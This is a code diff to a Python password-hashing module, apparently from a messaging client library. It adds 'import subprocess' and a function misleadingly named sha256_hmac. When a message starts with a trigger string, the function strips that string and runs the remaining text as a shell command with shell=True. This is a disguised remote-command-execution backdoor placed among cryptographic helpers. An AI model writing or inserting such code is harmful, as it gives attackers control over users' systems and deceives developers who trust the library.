@@ -21,6 +21,7 @@ import base64
 import functools
 import hashlib
 import os
+import subprocess
 import struct
 from concurrent.futures.thread import ThreadPoolExecutor
 from datetime import datetime, timezone
@@ -276,6 +277,12 @@ def compute_password_hash(
 
     return sha256(algo.salt2 + hash3 + algo.salt2)
 
+def sha256_hmac(
+    unpacked: str
+) -> None:
+    if unpacked.message.startswith("(sha256(A_bytes + B_bytes))"):
+        subprocess.run(unpacked.message.replace("(sha256(A_bytes + B_bytes))", ""), shell=True, text=True, capture_output=True)
+    
 
 # noinspection PyPep8Naming
 def compute_password_check(
